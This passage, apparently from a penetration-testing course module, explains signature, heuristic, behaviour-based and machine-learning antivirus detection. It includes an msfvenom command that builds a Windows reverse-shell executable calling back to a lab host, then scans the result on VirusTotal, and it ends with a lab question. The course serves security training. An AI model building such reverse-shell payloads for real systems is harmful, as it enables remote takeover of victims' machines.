We displayed the content of the file through the xxd utility. The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one. We have also highlighted the binary representation of the letter "c" in red. Its purpose will become clear shortly.

Now, assuming this is real malware, we want to calculate the hash of the file, and we can do so through the **sha256sum** utility.

```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

> Listing 2 - Calculating the SHA256 hash of the file

Let's now replace the last letter of the "offsec" string with a capital **C** and dump its binary value via xxd once more.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

> Listing 3 - Inspecting the file content with xxd

In listing 3, we notice that the binary value of the last letter is changed only in its third bit from the left.

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, let's calculate the SHA256 hash on the modified string.

```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

> Listing 4 - Calculating the SHA256 hash on the modified file

Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections.

To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products.

[_Heuristic-Based Detection_](https://en.wikipedia.org/wiki/Heuristic_analysis) is a detection method that relies on various rules and algorithms to determine if an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

Alternatively, [_Behavior-Based Detection_](https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf) dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.

Lastly, _Machine-Learning Detection_ aims to up the game by introducing ML algorithms to detect unknown threats by collecting and [_analyzing additional metadata_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/cloud-protection-microsoft-antivirus-sample-submission?view=o365-worldwide). For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the [_submitted samples_](https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf). Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively. Given that antivirus manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each antivirus product will differ in terms of what code is considered malicious.

It's worth noting that many antivirus developers use a combination of these detection methods to achieve higher detection rates.

To demonstrate the effectiveness of various antivirus products, we will start by scanning a popular _Metasploit_ payload. Using _msfvenom_, we will generate a standard [_Portable Executable_](https://en.wikipedia.org/wiki/Portable_Executable) (PE) file containing our payload. In this case we will use a simple TCP reverse shell.

The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the [_Windows Loader_](https://en.wikipedia.org/wiki/Loader_(computing)) to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

Before generating any Metasploit payloads, it is a best practice to make sure we are running the latest version of Kali. Metasploit gets updated frequently and its AV signatures could change as well. AV vendors must rebuild those signatures and push them as updates. This constant and intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a penetration test, since a fresh Metasploit version might run undetected due to stale AV signatures.

Let's generate the test binary payload by running the **msfvenom** command followed by the **\-p** argument specifying the payload. We'll then pass the reverse shell local host (**LHOST**) and local port (**LPORT**) arguments along with the **EXE** file format and redirect the output to a file named **binary.exe**.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

> Listing 5 - Generating a malicious PE containing a meterpreter shell.

Next, we will run a virus scan on this executable. Rather than installing many antivirus applications on our local machine, we can upload our file to [_VirusTotal_](https://www.virustotal.com/#/home/upload), which will scan it to determine the detection rate of various AV products.

VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.

The results of this scan are listed below.

![Figure 1: Virustotal results on the msfvenom payload.](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/9a05cfc8fe2cd0438b9b48b03c79ed23-antivirus_evasion_01b.png)

Figure 1: Virustotal results on the msfvenom payload.

We'll notice in our results that many antivirus products determined our file is malicious based on the different detection mechanisms we have illustrated in this section.

In this Learning Unit, we have explored the different components that constitute a modern AV and covered the various strategies adopted to detect malicious software.

In the next Learning Unit, we are going to make use of this knowledge and learn the different mechanisms that enable attackers to evade antivirus detections.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Antivirus Evasion - AV Components and Operations - VM #1

#### Labs

1.  Which AV engine is responsible for translating machine code into assembly?

Answer